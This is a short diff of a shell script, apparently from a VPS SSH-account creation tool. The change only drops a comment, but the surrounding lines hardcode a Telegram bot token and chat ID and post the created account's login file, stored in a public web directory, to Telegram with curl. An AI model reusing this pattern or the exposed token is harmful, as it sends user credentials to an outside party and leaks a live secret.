@@ -289,8 +289,7 @@ echo "" | tee -a /etc/log-create-user.log
 # Cara otomatis kirim isi file teks hasil create ke Telegram
 TOKEN="8226263150:AAFdiVuQeEshxOpSvema_F6fDwbyFcfNWnw"
 CHAT_ID="6577966386"
-HASIL_LOG="/home/vps/public_html/ssh-$Login.txt" # Sesuaikan nama filenya
-
+HASIL_LOG="/home/vps/public_html/ssh-$Login.txt"
 curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
     -d text="$(cat $HASIL_LOG)" > /dev/null
